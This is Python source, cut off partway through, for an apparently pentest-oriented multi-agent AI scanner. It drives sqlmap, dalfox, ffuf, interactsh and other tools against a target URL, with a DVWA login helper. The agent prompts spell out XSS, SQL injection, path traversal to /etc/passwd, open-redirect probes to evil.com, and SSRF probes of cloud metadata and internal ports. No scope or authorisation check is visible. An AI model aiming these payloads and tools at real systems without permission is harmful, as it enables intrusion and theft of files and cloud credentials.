import os
import sys
import json
import re
import warnings
import time
import subprocess
from urllib.parse import urlencode, urljoin
from bs4 import BeautifulSoup
import requests
from crewai import Agent, Task, Crew, Process, LLM
from crewai.tools import tool

# Suppress warnings
warnings.filterwarnings("ignore")
requests.packages.urllib3.disable_warnings()

# Force stdout and stderr to use UTF-8
if sys.platform == "win32":
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')

# Setup paths
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TOOLS_DIR = os.path.join(SCRIPT_DIR, "tools")
PYTHON_EXE = sys.executable

def _tool_path(name):
    """Resolve tool binary path: on Windows use TOOLS_DIR/*.exe, on Linux use system PATH."""
    if sys.platform == "win32":
        return os.path.join(TOOLS_DIR, f"{name}.exe")
    return name  # installed to PATH in Docker

# Ensure Wordlists exist
WORDLISTS_DIR = os.path.join(SCRIPT_DIR, "wordlists")
LFI_WORDLIST = os.path.join(WORDLISTS_DIR, "lfi-payloads.txt")
os.makedirs(WORDLISTS_DIR, exist_ok=True)
if not os.path.exists(LFI_WORDLIST):
    with open(LFI_WORDLIST, "w") as f:
        f.write("../../../../etc/passwd\n..\\..\\..\\..\\windows\\win.ini\n")

# ─── Authentication Module ──────────────────────────────────────────────────
# Global session cookies — set once at startup, used by every tool
SESSION_COOKIES = {}   # e.g. {"PHPSESSID": "abc123", "security": "low"}
SESSION_COOKIE_STR = ""  # pre-built "k=v; k2=v2" string for CLI tools


def _parse_auth_options():
    """Parse --auth JSON from CLI args (passed by aiScanner.js)."""
    for i, arg in enumerate(sys.argv):
        if arg == "--auth" and i + 1 < len(sys.argv):
            try:
                return json.loads(sys.argv[i + 1])
            except json.JSONDecodeError:
                print("[Auth] Failed to parse --auth JSON", file=sys.stderr)
    return {}


def _perform_dvwa_login(base_url, username, password, login_path="/login.php", security_level="low"):
    """Login to DVWA and return session cookies dict."""
    session = requests.Session()
    session.verify = False
    session.headers.update({"User-Agent": "Phoenix-AI"})

    # Normalize base URL
    if not base_url.endswith("/") and "." not in base_url.split("/")[-1]:
        base_url += "/"
    login_url = urljoin(base_url, login_path.lstrip("/"))

    print(f"[Auth] Attempting DVWA login at {login_url}", file=sys.stderr)

    # Step 1 — GET login page for CSRF token + initial PHPSESSID
    get_resp = session.get(login_url, timeout=10)
    soup = BeautifulSoup(get_resp.text, "html.parser")

    # Find user_token hidden field (DVWA CSRF)
    post_data = {"username": username, "password": password, "Login": "Login"}
    token_input = soup.find("input", {"name": "user_token"})
    if token_input:
        post_data["user_token"] = token_input.get("value", "")

    # Step 2 — POST credentials
    post_resp = session.post(login_url, data=post_data, allow_redirects=False, timeout=10)

    # Step 3 — Set security level cookie
    session.cookies.set("security", security_level)

    # Build final cookie dict
    cookies = {c.name: c.value for c in session.cookies}

    if "PHPSESSID" in cookies:
        print(f"[Auth] ✅ Login successful! PHPSESSID={cookies['PHPSESSID'][:8]}..., security={security_level}", file=sys.stderr)
    else:
        print(f"[Auth] ⚠️ Login returned HTTP {post_resp.status_code} — no PHPSESSID found", file=sys.stderr)

    return cookies


def _init_session():
    """Initialize SESSION_COOKIES from CLI --auth options (called once at startup)."""
    global SESSION_COOKIES, SESSION_COOKIE_STR
    auth = _parse_auth_options()
    if not auth:
        return

    if auth.get("cookies"):
        # Raw cookies provided by user (from frontend cookie-injection field)
        for part in auth["cookies"].split(";"):
            if "=" in part:
                k, v = part.strip().split("=", 1)
                SESSION_COOKIES[k.strip()] = v.strip()
        print(f"[Auth] Using raw cookies: {list(SESSION_COOKIES.keys())}", file=sys.stderr)
    elif auth.get("username") and auth.get("password"):
        SESSION_COOKIES = _perform_dvwa_login(
            base_url=sys.argv[1],  # target URL
            username=auth["username"],
            password=auth["password"],
            login_path=auth.get("loginPath", "/login.php"),
            security_level=auth.get("securityLevel", "low"),
        )

    SESSION_COOKIE_STR = "; ".join(f"{k}={v}" for k, v in SESSION_COOKIES.items())


def get_auth_headers():
    """Return dict with Cookie header if session is active, else empty dict."""
    if SESSION_COOKIE_STR:
        return {"Cookie": SESSION_COOKIE_STR, "User-Agent": "Phoenix-AI"}
    return {"User-Agent": "Phoenix-AI"}


# Run auth init immediately so cookies are ready before tools are called
_init_session()

# 1. Setup LLMs — Pro for attack agents, Flash for recon/validation (faster)
api_key = os.environ.get("GEMINI_API_KEY", "")
llm_pro = LLM(
    model="gemini/gemini-2.5-pro", 
    api_key=api_key,
    temperature=0.1
)
llm_flash = LLM(
    model="gemini/gemini-2.5-flash",
    api_key=api_key,
    temperature=0.1
)

# ─── Pre-Crawled Data (from script engine deep crawling) ──────────────────────
# The Node.js bridge runs the Crawler first, then passes results via --crawl-data
CRAWL_DATA_FILE = None
for _i, _arg in enumerate(sys.argv):
    if _arg == "--crawl-data" and _i + 1 < len(sys.argv):
        CRAWL_DATA_FILE = sys.argv[_i + 1]
        break

def _load_crawl_data():
    """Load pre-crawled data from JSON file produced by Node.js Crawler."""
    if not CRAWL_DATA_FILE or not os.path.exists(CRAWL_DATA_FILE):
        return {"pages": [], "forms": [], "errors": []}
    try:
        with open(CRAWL_DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception as e:
        print(f"[CrawlData] Failed to load {CRAWL_DATA_FILE}: {e}", file=sys.stderr)
        return {"pages": [], "forms": [], "errors": []}

# 2. Enhanced Security Tools using Real CLI Tools
# --- RECON TOOLS ---
@tool("load_crawl_data")
def load_crawl_data(target_url: str) -> str:
    """Loads pre-crawled deep crawling data (endpoints, parameters, forms) discovered by the script engine's Crawler.
    This data includes all pages visited, query parameters found, HTML forms with their inputs, and response headers.
    Use this as the FIRST step to get a complete attack surface map without needing to crawl again."""
    try:
        data = _load_crawl_data()
        pages = data.get("pages", [])
        forms = data.get("forms", [])

        # Extract endpoints with parameters
        all_endpoints = [p["url"] for p in pages if p.get("url")]
        param_endpoints = [p["url"] for p in pages if p.get("params") and len(p["params"]) > 0]

        # Extract form details
        form_details = []
        for form in forms:
            form_details.append({
                "pageUrl": form.get("pageUrl", ""),
                "action": form.get("action", ""),
                "method": form.get("method", "GET"),
                "inputs": form.get("inputs", {})
            })

        # Extract headers from first page for tech fingerprinting
        headers = {}
        if pages:
            headers = pages[0].get("headers", {})

        # Identify technologies from headers
        tech_hints = []
        cookies_str = headers.get("set-cookie", "")
        if "PHPSESSID" in str(cookies_str): tech_hints.append("PHP")
        if "connect.sid" in str(cookies_str): tech_hints.append("Express/Node.js")
        if "JSESSIONID" in str(cookies_str): tech_hints.append("Java")
        if "ASP.NET" in str(cookies_str): tech_hints.append("ASP.NET")
        server = headers.get("server", headers.get("Server", ""))
        if server: tech_hints.append(f"Server: {server}")
        powered = headers.get("x-powered-by", headers.get("X-Powered-By", ""))
        if powered: tech_hints.append(f"Powered-By: {powered}")

        result = {
            "source": "Script Engine Deep Crawling",
            "total_pages": len(all_endpoints),
            "param_endpoints": param_endpoints[:80],
            "all_endpoints": all_endpoints[:100],
            "forms": form_details[:30],
            "technology_hints": tech_hints,
            "headers_sample": {k: v for k, v in list(headers.items())[:15]} if headers else {},
            "crawl_errors": len(data.get("errors", []))
        }
        return json.dumps(result)
    except Exception as e:
        return json.dumps({"error": f"Failed to load crawl data: {str(e)}", "param_endpoints": [], "forms": []})

@tool("historical_urls")
def historical_urls(domain: str) -> str:
    """Fetches historical URLs using GAU."""
    try:
        # GAU uses double-dash flags; strip protocol from domain if present
        clean_domain = domain.replace("https://", "").replace("http://", "").rstrip("/")
        cmd = [
            _tool_path("gau"),
            "--threads", "5", "--timeout", "20",
            clean_domain
        ]
        res = subprocess.run(
            cmd, capture_output=True, timeout=45,
            encoding='utf-8', errors='replace', stdin=subprocess.DEVNULL
        )
        stdout = res.stdout.strip()
        if not stdout:
            err_msg = res.stderr.strip()[:300] if res.stderr else "No URLs returned"
            return json.dumps({"historical_urls": [], "note": err_msg})
        urls = list(set(line.strip() for line in stdout.split('\n') if line.strip()))
        interesting = [u for u in urls if '?' in u]
        return json.dumps({"historical_urls": interesting[:50], "total_found": len(urls)})
    except subprocess.TimeoutExpired:
        return json.dumps({"historical_urls": [], "error": "GAU timed out after 45s"})
    except Exception as e:
        return f"GAU Error: {str(e)}"

@tool("fetch_site_data")
def fetch_site_data(url: str) -> str:
    """Extracts HTML forms, inputs, basic metadata, AND the page HTML body (for JavaScript source-to-sink analysis)."""
    try:
        res = requests.get(url, timeout=10, verify=False, headers=get_auth_headers())
        soup = BeautifulSoup(res.text, 'html.parser')
        forms = [{"action": f.get('action'), "method": f.get('method', 'GET').upper(), "inputs": [i.get('name') for i in f.find_all('input') if i.get('name')]} for f in soup.find_all('form')]
        # Include truncated body so DOM XSS agent can analyze JavaScript source-to-sink flows
        body_text = res.text[:4000] if res.text else ""
        return json.dumps({"status": res.status_code, "forms": forms, "headers": dict(res.headers), "body": body_text})
    except Exception as e: return f"Fetch Error: {str(e)}"

# --- XSS TOOLS ---
@tool("dalfox_xss_scan")
def dalfox_xss_scan(url: str) -> str:
    """Runs Dalfox XSS scanner with context-aware payloads."""
    try:
        cmd = [_tool_path("dalfox"), "url", url, "--format", "json", "--silence", "--timeout", "8", "--worker", "5"]
        if SESSION_COOKIE_STR:
            cmd.extend(["--header", f"Cookie: {SESSION_COOKIE_STR}"])
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=120, stdin=subprocess.DEVNULL)
        # Parse JSON lines safely — Dalfox may output non-JSON status messages
        findings = []
        for line in res.stdout.strip().split('\n'):
            if line.strip():
                try:
                    findings.append(json.loads(line))
                except json.JSONDecodeError:
                    pass  # Skip non-JSON status lines from Dalfox
        return json.dumps({"findings": findings[:10]})
    except subprocess.TimeoutExpired:
        return json.dumps({"findings": [], "error": "Dalfox timed out after 120s"})
    except Exception as e: return f"Dalfox Error: {str(e)}"

@tool("kxss_reflection_check")
def kxss_reflection_check(url: str) -> str:
    """Quickly checks which parameters reflect user input and which special characters survive unencoded."""
    try:
        kxss_bin = _tool_path("kxss")
        # Use platform-appropriate piping to avoid shell quoting issues
        if sys.platform == "win32":
            # PowerShell-safe: use Write-Output to pipe URL into kxss
            cmd = f'powershell -Command "Write-Output \'{url}\' | & \'\'{kxss_bin}\'\' "'
        else:
            cmd = f'echo "{url}" | "{kxss_bin}"'
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = res.stdout.strip()
        if not output:
            # Fallback: run kxss directly with input via stdin
            proc = subprocess.run(
                [kxss_bin], input=url + "\n", capture_output=True, text=True, timeout=30
            )
            output = proc.stdout.strip()
        return output if output else "No reflection found."
    except Exception as e: return f"KXSS Error: {str(e)}"

# --- SQLI TOOLS ---
@tool("sqlmap_scan")
def sqlmap_scan(url: str, data: str = "", method: str = "GET") -> str:
    """Runs SQLMap against the URL. For POST endpoints, provide form data as 'param1=val1&param2=val2' in the data argument and set method to POST."""
    try:
        sqlmap_path = os.path.join(TOOLS_DIR, "SQLMap", "sqlmap.py")
        cmd = [PYTHON_EXE, sqlmap_path, "-u", url, "--batch", "--level=2", "--risk=2", "--random-agent", "--threads=3", "--timeout=8"]
        if data:
            cmd.extend(["--data", data])
        if method.upper() != "GET":
            cmd.extend(["--method", method.upper()])
        if SESSION_COOKIE_STR:
            cmd.extend(["--cookie", SESSION_COOKIE_STR])
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=120, stdin=subprocess.DEVNULL)
        output = res.stdout + res.stderr
        if "is vulnerable" in output or "injectable" in output:
            lines = [l for l in output.split('\n') if 'Payload:' in l or 'back-end DBMS:' in l or 'Type:' in l or 'injectable' in l.lower()]
            return f"SQLi Confirmed.\n" + "\n".join(lines)
        return "No SQLi found by SQLMap."
    except subprocess.TimeoutExpired:
        return json.dumps({"error": "SQLMap timed out after 120s", "result": "inconclusive"})
    except Exception as e: return f"SQLMap Error: {str(e)}"

# --- LFI TOOLS ---
@tool("ffuf_lfi_fuzz")
def ffuf_lfi_fuzz(url: str, parameter: str) -> str:
    """Fuzzes a parameter with LFI payloads using ffuf."""
    try:
        fuzz_url = f"{url}&{parameter}=FUZZ" if "?" in url else f"{url}?{parameter}=FUZZ"
        cmd = [_tool_path("ffuf"), "-u", fuzz_url, "-w", LFI_WORDLIST, "-mc", "200", "-json", "-silent"]
        if SESSION_COOKIE_STR:
            cmd.extend(["-H", f"Cookie: {SESSION_COOKIE_STR}"])
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=45, stdin=subprocess.DEVNULL)
        hits = []
        if res.stdout.strip():
            try:
                data = json.loads(res.stdout)
                hits = [{"payload": r.get("input", {}).get("FUZZ", ""), "length": r.get("length")} for r in data.get("results", [])]
            except: pass
        return json.dumps({"lfi_hits": hits[:10]})
    except Exception as e: return f"FFUF Error: {str(e)}"

# --- SSRF TOOLS ---
@tool("interactsh_ssrf_test")
def interactsh_ssrf_test(url: str, parameter: str) -> str:
    """Generates Interactsh OOB callback URL, injects it into the parameter, then checks if the server made an outbound request (blind SSRF)."""
    proc = None
    try:
        import threading
        interactsh_bin = _tool_path("interactsh-client")
        proc = subprocess.Popen(
            [interactsh_bin, "-json", "-n", "1", "-poll-interval", "2"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, stdin=subprocess.DEVNULL
        )

        # Collect output lines from BOTH stdout AND stderr in threads to avoid blocking
        output_lines = []
        stderr_lines = []
        def stdout_reader():
            try:
                for line in proc.stdout:
                    output_lines.append(line.strip())
            except: pass
        def stderr_reader():
            try:
                for line in proc.stderr:
                    stderr_lines.append(line.strip())
            except: pass
        t_out = threading.Thread(target=stdout_reader, daemon=True)
        t_err = threading.Thread(target=stderr_reader, daemon=True)
        t_out.start()
        t_err.start()

        # Wait up to 20 seconds for the callback URL to appear (increased from 8s)
        callback_url = None
        deadline = time.time() + 20
        while time.time() < deadline:
            # Search both stdout and stderr for the callback URL
            all_lines = output_lines + stderr_lines
            for line in all_lines:
                if not line:
                    continue
                # Try JSON parsing first (interactsh outputs JSON with url key)
                if ".oast." in line or "interact" in line or "canary" in line:
                    try:
                        parsed = json.loads(line)
                        callback_url = parsed.get("interactsh_url", parsed.get("url", ""))
                        if callback_url:
                            break
                    except (json.JSONDecodeError, AttributeError):
                        pass
                    # Fallback: extract URL-like string from plain text (e.g. [INF] log lines)
                    match = re.search(r'([a-z0-9]+\.oast\.[a-z.]+)', line)
                    if match:
                        callback_url = match.group(1)
                        break
                    match = re.search(r'([a-z0-9]+\.interact\.sh)', line)
                    if match:
                        callback_url = match.group(1)
                        break
            if callback_url:
                break
            time.sleep(0.5)

        if not callback_url:
            proc.kill()
            # Include stderr for debugging
            debug_info = "; ".join(stderr_lines[:3]) if stderr_lines else "no stderr output"
            return json.dumps({"error": f"Interactsh could not generate callback URL within 20s. Debug: {debug_info}", "ssrf_confirmed": False})

        # Inject the callback URL into the target parameter
        payload_url = f"http://{callback_url}"
        try:
            sep = "&" if "?" in url else "?"
            requests.get(f"{url}{sep}{parameter}={payload_url}", timeout=10, verify=False, headers=get_auth_headers())
        except: pass

        # Wait briefly for any server-side callback to arrive
        time.sleep(6)

        # Check for interactions in the collected output
        proc.kill()
        t_out.join(timeout=2)
        t_err.join(timeout=2)
        all_output = output_lines + stderr_lines
        interactions = [l for l in all_output if "remote-address" in l or '"protocol"' in l]
        return json.dumps({
            "ssrf_confirmed": len(interactions) > 0,
            "callback_url": payload_url,
            "parameter": parameter,
            "interactions_count": len(interactions),
            "note": "ssrf_confirmed=true means the server made an outbound request to our callback"
        })
    except Exception as e:
        if proc:
            try: proc.kill()
            except: pass
        return json.dumps({"error": f"Interactsh failed: {str(e)}", "ssrf_confirmed": False})

# --- API TOOLS ---
@tool("arjun_param_discovery")
def arjun_param_discovery(url: str, method: str) -> str:
    """Discovers hidden API parameters using Arjun."""
    try:
        arjun_path = os.path.join(TOOLS_DIR, "Arjun", "arjun", "__main__.py")
        cmd = [PYTHON_EXE, arjun_path, "-u", url, "-m", method.upper(), "--json"]
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=45, stdin=subprocess.DEVNULL)
        try: params = json.loads(res.stdout).get("params", [])
        except: params = []
        return json.dumps({"hidden_params": params})
    except Exception as e: return f"Arjun Error: {str(e)}"

# --- CROSS-AGENT VALIDATOR ---
@tool("nuclei_scan")
def nuclei_scan(url: str, tags: str) -> str:
    """Runs Nuclei scanner."""
    try:
        cmd = [_tool_path("nuclei"), "-u", url, "-json", "-silent", "-tags", tags, "-rl", "30", "-c", "10"]
        if SESSION_COOKIE_STR:
            cmd.extend(["-H", f"Cookie: {SESSION_COOKIE_STR}"])
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=90, stdin=subprocess.DEVNULL)
        # Parse JSON lines safely — Nuclei may output non-JSON lines
        findings = []
        for line in res.stdout.strip().split('\n'):
            if line.strip():
                try:
                    findings.append(json.loads(line))
                except json.JSONDecodeError:
                    pass
        return json.dumps({"findings": findings[:10]})
    except subprocess.TimeoutExpired:
        return json.dumps({"findings": [], "error": "Nuclei timed out after 90s"})
    except Exception as e: return f"Nuclei Error: {str(e)}"

# --- GENERAL ---
@tool("active_payload_tester")
def active_payload_tester(url: str, method: str, parameter: str, payload: str) -> str:
    """Sends a payload to a parameter and returns status, reflection check, response time, AND a body snippet for analysis.
    The body_snippet field contains the first 500 chars of the response — use it to check for SQL errors, file contents, internal HTML, etc."""
    try:
        time.sleep(0.5)
        params = {parameter: payload}
        hdrs = get_auth_headers()
        start_time = time.time()
        if method.upper() == "POST":
            res = requests.post(url, data=params, timeout=10, verify=False, headers=hdrs, allow_redirects=False)
        elif method.upper() == "DELETE":
            res = requests.delete(url, params=params, timeout=10, verify=False, headers=hdrs, allow_redirects=False)
        elif method.upper() == "PUT":
            res = requests.put(url, data=params, timeout=10, verify=False, headers=hdrs, allow_redirects=False)
        else:
            res = requests.get(url, params=params, timeout=10, verify=False, headers=hdrs, allow_redirects=False)
        elapsed = time.time() - start_time
        body_snippet = res.text[:500] if res.text else ""
        # Build response headers dict for redirect detection
        resp_headers = {}
        if "Location" in res.headers:
            resp_headers["Location"] = res.headers["Location"]
        return json.dumps({
            "status": res.status_code,
            "reflected": payload in res.text,
            "time": f"{elapsed:.2f}s",
            "body_snippet": body_snippet,
            "content_length": len(res.text),
            "response_headers": resp_headers
        })
    except Exception as e: return f"Test failed: {str(e)}"


# 3. Define 8 Specialized Agents

recon_specialist = Agent(
    role='Elite Cyber Intelligence & Reconnaissance Specialist',
    goal='Map the COMPLETE technical attack surface of {target_url}. Analyze all pre-crawled endpoints, parameters, forms, and technology details.',
    backstory='''You are an expert in digital footprinting and web infrastructure analysis.
Your methodology:
Step 1 — Load Crawl Data: Use load_crawl_data to get ALL endpoints, parameters, and forms that were already discovered by the deep crawler.
Step 2 — Technology Fingerprinting: Analyze the headers and cookies from the crawl data (PHPSESSID=PHP, connect.sid=Express, JSESSIONID=Java).
Step 3 — Historical Discovery: Use historical_urls to find deleted/hidden endpoints from Wayback Machine.
Step 4 — Parameter Categorization:
  HIGH VALUE (test first): Search boxes (XSS/SQLi), Login forms (SQLi), File params (LFI), Redirect params (Open Redirect), URL params (SSRF), API endpoints
  MEDIUM VALUE: Comment forms, profile updates, contact forms
  LOW VALUE: Pagination, theme selectors
Output a structured attack map listing every endpoint with its parameters and which vulnerability type to test.
Be FAST and CONCISE — do NOT over-analyze. Output the map and move on.''',
    llm=llm_flash,
    tools=[load_crawl_data, historical_urls, fetch_site_data],
    allow_delegation=False,
    verbose=True
)

xss_agent = Agent(
    role='Senior XSS Penetration Tester',
    goal='Execute a multi-stage verification process to identify and CONFIRM XSS vulnerabilities on {target_url} with zero false positives.',
    backstory='''You are a world-class XSS specialist. You follow a strict 5-step process:
Step 1 — Reflection Discovery: Run kxss_reflection_check on each endpoint URL with parameters to quickly find which params reflect input and which chars survive unencoded.
Step 2 — Automated Deep Scan: For EVERY reflecting endpoint, run dalfox_xss_scan which tests 2000+ context-aware payloads with WAF evasion.
Step 3 — Manual Verification: If Dalfox finds hits, use active_payload_tester to manually confirm by sending the exact payload and checking "reflected": true.
Step 4 — Context Analysis: Determine WHERE the payload reflects:
  Context A — HTML body: <div>payload</div> → use <svg onload=alert(1)>
  Context B — Attribute: <input value="payload"> → use " onmouseover="alert(1)
  Context C — JavaScript: var x = "payload" → use ';alert(1)//
Step 5 — Evidence Collection: For each confirmed XSS, record the exact parameter, payload, injection context, and response snippet.
CRITICAL RULES:
- You MUST use kxss_reflection_check FIRST to pre-filter endpoints
- Then run dalfox_xss_scan on reflecting endpoints
- NEVER report XSS without tool-confirmed evidence
- Ignore static files, focus ONLY on dynamic endpoints with parameters''',
    llm=llm_pro,
    tools=[kxss_reflection_check, dalfox_xss_scan, active_payload_tester],
    allow_delegation=False,
    verbose=True
)

sqli_agent = Agent(
    role='Senior SQL Injection Security Auditor',
    goal='Detect and CONFIRM SQL injection vulnerabilities on {target_url} using SQLMap and manual verification.',
    backstory='''You are a database security specialist. Your methodology:
Step 1 — Parameter Selection: From the recon report, identify HIGH-VALUE parameters: id, search, username, sort, filter, category, user, order, item, product, page.
Step 2 — Quick Error Probe: Use active_payload_tester to send a single quote (') to each parameter. Check the body_snippet for SQL error signatures:
  MySQL: "You have an error in your SQL syntax", "mysql_fetch"
  PostgreSQL: "unterminated quoted string", "pg_query"
  MSSQL: "Unclosed quotation mark", "ODBC SQL Server Driver"
  SQLite: "SQLITE_ERROR", "unrecognized token"
Step 3 — SQLMap Deep Scan: For EVERY suspect URL, run sqlmap_scan.
  For GET parameters: sqlmap_scan(url="http://target/page?param=value")
  For POST forms: sqlmap_scan(url="http://target/action", data="param1=val1&param2=val2", method="POST")
  SQLMap tests: Error-based, Boolean-blind, Union, Stacked, Time-based. It handles WAF evasion.
Step 4 — Analyze SQLMap Output: Check for:
  - "is vulnerable" or "injectable" → CONFIRMED SQLi
  - "back-end DBMS:" → Database type identified
  - "Payload:" → The exact working payload
Step 5 — Manual Time-Based Fallback: If SQLMap finds nothing, use active_payload_tester with time-based payloads:
  MySQL: ' OR SLEEP(5)-- -
  PostgreSQL: ' OR pg_sleep(5)-- -
  CONFIRMED if response_time >= 5 seconds (check the "time" field)
CRITICAL RULES:
- ALWAYS test POST login/search forms using sqlmap_scan with data= parameter
- ALWAYS run sqlmap_scan on URLs that have query parameters
- Use the body_snippet from active_payload_tester to look for SQL error messages
- Extract the DBMS type and exact payload for the report
- NEVER report SQLi without SQLMap confirmation or measurable time delay''',
    llm=llm_pro,
    tools=[sqlmap_scan, active_payload_tester],
    allow_delegation=False,
    verbose=True
)

lfi_agent = Agent(
    role='Senior File Inclusion & Redirection Security Auditor',
    goal='Identify and validate Local File Inclusion (LFI) and Open Redirect vulnerabilities on {target_url} using automated fuzzing.',
    backstory='''You are an expert in filesystem security and URL redirection attacks.
Your methodology:
=== LFI TESTING ===
Step 1 — Parameter Identification: From recon, find parameters that imply file handling: page, file, doc, path, template, include, lang, view, content, load.
Step 2 — Automated Fuzzing: Use ffuf_lfi_fuzz with the parameter name. This tests 30+ path traversal payloads including encoding bypasses.
Step 3 — Manual Verification: Use active_payload_tester to confirm hits:
  Linux: Send ../../../../etc/passwd → Check body_snippet for "root:x:0:0:" 
  Windows: Send ..\\..\\..\\..\\windows\\win.ini → Check body_snippet for "[extensions]"
  Java: Send ../../../../WEB-INF/web.xml → Check body_snippet for "<web-app"
  PHP: Send php://filter/convert.base64-encode/resource=index.php → Check body_snippet for base64 output
Step 4 — Bypass Techniques: If basic payloads fail, try:
  ....//....//etc/passwd (double-dot bypass)
  ..%2f..%2f..%2fetc%2fpasswd (URL encoding)
  ..%252f..%252f (double encoding)

=== OPEN REDIRECT TESTING ===
Step 5 — Find redirect parameters: url, redirect, next, dest, return, returnUrl, goto, target, rurl, out, link
Step 6 — Test with active_payload_tester:
  Basic: https://evil.com, //evil.com
  Bypass: https://target.com@evil.com, ///evil.com
  CONFIRMED if status 301/302 AND response_headers contains "Location" pointing to external domain

CRITICAL RULES:
- Use ffuf_lfi_fuzz FIRST for automated coverage
- Manually verify ANY ffuf hit — check the body_snippet for actual file contents
- A 500 error on path traversal is suspicious (may indicate processing) — try more bypasses
- For Open Redirect, check response_headers.Location (must contain external domain)''',
    llm=llm_pro,
    tools=[ffuf_lfi_fuzz, active_payload_tester],
    allow_delegation=False,
    verbose=True
)

ssrf_agent = Agent(
    role='Server-Side Request Forgery (SSRF) Specialist',
    goal='Detect SSRF vulnerabilities on {target_url} by confirming the server makes outbound requests to attacker-controlled or internal URLs.',
    backstory='''You are an SSRF exploitation expert. Your methodology:
Step 1 — Identify SSRF-Prone Parameters: Focus on params that accept URLs or hostnames: url, link, src, href, target, proxy, fetch, load, request, image_url, avatar_url, webhook, callback, preview, pdf_url, import_url, api_url, HostName, host, server.
Step 2 — Blind SSRF with Interactsh: Use interactsh_ssrf_test with the parameter name. This generates a unique callback URL and checks if the server makes an outbound request.
  If ssrf_confirmed=true → The server fetched our URL → CONFIRMED BLIND SSRF
Step 3 — Direct Internal Probing: Use active_payload_tester to inject internal URLs:
  http://127.0.0.1 → Check body_snippet for internal web server content (different from normal response)
  http://169.254.169.254/latest/meta-data/ → Check body_snippet for AWS metadata (CRITICAL if found)
  http://metadata.google.internal/computeMetadata/v1/ → GCP metadata
Step 4 — Internal Port Scanning: Test different ports and COMPARE content_length values:
  http://127.0.0.1:22 (SSH), http://127.0.0.1:3306 (MySQL), http://127.0.0.1:6379 (Redis)
  CONFIRMED if different content_length values per port (server is fetching and returning different content)
Step 5 — Bypass Techniques (if basic blocked):
  Decimal IP: http://2130706433 (=127.0.0.1)
  IPv6: http://[::1]
  Shorthand: http://0

CRITICAL RULES:
- ALWAYS try interactsh_ssrf_test first for blind SSRF detection
- Cloud metadata access = CRITICAL severity
- Check body_snippet for actual internal content — "reflected":true alone is NOT proof of SSRF
- Compare content_length across different internal IPs/ports — varying sizes suggest server-side fetching
- URL simply echoed in HTML is NOT SSRF (the body_snippet must contain fetched content)''',
    llm=llm_pro,
    tools=[interactsh_ssrf_test, active_payload_tester],
    allow_delegation=False,
    verbose=True
)

dom_xss_agent = Agent(
    role='DOM-Based XSS Security Specialist',
    goal='Detect DOM-based XSS vulnerabilities on {target_url} by analyzing client-side JavaScript source-to-sink data flows.',
    backstory='''You are a client-side security expert. DOM XSS is different from reflected XSS — the payload NEVER reaches the server.
Your methodology:
Step 1 — Fetch Page Source: Use fetch_site_data to get the full HTML including inline JavaScript. The tool returns a "body" field containing the page HTML — analyze this for JavaScript code.
Step 2 — Identify SOURCES (user-controlled inputs): Search the "body" field for:
  location.hash, location.search, location.href, document.URL, document.referrer, window.name, postMessage, localStorage, sessionStorage
Step 3 — Identify SINKS (dangerous output functions): Search the "body" field for:
  document.write, document.writeln, innerHTML, outerHTML, insertAdjacentHTML, eval(), setTimeout(string), setInterval(string), Function(), jQuery .html(), .append()
Step 4 — Flow Analysis: A vulnerability exists ONLY if a SOURCE feeds directly into a SINK without sanitization.
  EXPLOITABLE if: No DOMPurify, no encodeURIComponent, no escapeHtml between source and sink
  NOT EXPLOITABLE if: DOMPurify.sanitize() applied, or only hardcoded strings reach sink
Step 5 — Construct Trigger URLs and Test:
  location.hash source: Use active_payload_tester with URL like page#<img src=x onerror=alert(1)>
  location.search source: Use active_payload_tester with ?param=<svg onload=alert(1)>
Step 6 — Verify DOM-Specific Nature: If "reflected": true → it's REFLECTED XSS (not DOM). If "reflected": false BUT source-to-sink flow exists → CONFIRMED DOM XSS.

CRITICAL RULES:
- You MUST read the "body" field from fetch_site_data and find actual JavaScript code containing sources and sinks
- Do NOT guess or assume — you must cite the exact JavaScript line from the body that shows the flow
- innerHTML alone is NOT a vulnerability — there must be a user-controlled source feeding it
- ALWAYS check if sanitization (DOMPurify) exists in the body
- DOM XSS payload should NOT be reflected by the server''',
    llm=llm_pro,
    tools=[fetch_site_data, active_payload_tester],
    allow_delegation=False,
    verbose=True
)

api_agent = Agent(
    role='API Security & Authentication Auditor',
    goal='Detect API-specific vulnerabilities on {target_url} including broken authentication, mass assignment, hidden parameters, and information disclosure.',
    backstory='''You are an API security specialist following OWASP API Security Top 10.
Your methodology:
Step 1 — API Endpoint Discovery: From recon, identify endpoints with /api/, /v1/, /v2/, /rest/, /graphql. Also probe:
  /swagger.json, /openapi.json, /api-docs (API documentation exposure)
  /debug, /status, /health, /metrics, /env (debug info)
Step 2 — Hidden Parameter Discovery: Use arjun_param_discovery on each API endpoint to find undocumented parameters like debug, admin, role, internal.
Step 3 — Broken Authentication Test: Use active_payload_tester:
  Test 1: Send request WITHOUT Authorization header → if 200 with data = BROKEN AUTH
  Test 2: Send with invalid token "Bearer invalid_token_12345" → if 200 = token not validated
Step 4 — HTTP Method Tampering: If endpoint expects GET, try POST/PUT/DELETE:
  Use active_payload_tester with method="DELETE" → if 200 = method not restricted
Step 5 — Mass Assignment Test: For POST endpoints, use active_payload_tester to add extra fields:
  Send parameter "role" with value "admin" → if accepted and reflected = mass assignment
Step 6 — Information Disclosure: Use fetch_site_data on /swagger.json, /api-docs, /graphql:
  If returns full API spec = MEDIUM severity info disclosure

CRITICAL RULES:
- 401/403 for unauthenticated requests means auth is WORKING (not a vuln)
- Public data endpoints are NOT vulnerabilities
- Finding an API endpoint alone is NOT a vulnerability''',
    llm=llm_pro,
    tools=[arjun_param_discovery, active_payload_tester, fetch_site_data],
    allow_delegation=False,
    verbose=True
)

validator_agent = Agent(
    role='Lead Security QA & Reporting Auditor',
    goal='Cross-validate ALL findings from attack agents, eliminate false positives, and produce a clean JSON vulnerability report for {target_url}.',
    backstory='''You are the final quality gate. Your job is to filter raw findings into verified vulnerabilities.
Do NOT run any tools — just analyze the evidence already provided by the attack agents.
